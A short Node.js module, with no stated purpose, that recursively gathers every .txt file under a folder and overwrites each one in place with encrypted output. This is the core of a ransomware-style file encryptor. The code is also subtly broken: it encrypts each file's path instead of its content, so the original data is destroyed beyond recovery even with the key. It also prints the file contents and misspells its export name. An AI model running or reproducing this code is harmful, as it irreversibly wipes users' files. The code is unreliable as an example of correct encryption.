import path from "path"
import FS from "fs"
import crypto from "crypto";
let files = []
const extensions = ['.txt']
let recursionCount = 0;

const ThroughDirectory = async (Directory, callback) => {
  recursionCount++;
  FS.readdirSync(Directory).forEach(file => {
    const Absolute = path.join(Directory, file)
    if (FS.statSync(Absolute).isDirectory()) {
      ThroughDirectory(Absolute, callback)
    }
    else if (extensions.includes(path.extname(file).toLowerCase())) {
      files.push(Absolute)
    }
    return 0;
  });
  recursionCount--;
  if (recursionCount === 0) {
    callback(files)
  }
}

const encryptData = (data, key, initVector, algorithm) => {
  
  const cipher = crypto.createCipheriv(algorithm, Buffer.from(key), initVector);
  let encryptedMessage = cipher.update(JSON.stringify(data));
  encryptedMessage = Buffer.concat([encryptedMessage, cipher.final()]);

  return encryptedMessage
}

export const getFiles = (folderPath) => {
  return new Promise((resolve, reject) => {
    try {
      ThroughDirectory(folderPath, resolve)
    } catch (error) {
      reject()
    }
  })
}

export const incryptFiles = async (files, key, initVector, algorithm) => {
  files.map(file => {
    const fileContent = FS.readFileSync(file, 'utf-8')
    console.log(fileContent);
    const encryptedData = encryptData(file, key, initVector, algorithm)
    FS.writeFileSync(file, encryptedData);
  })
}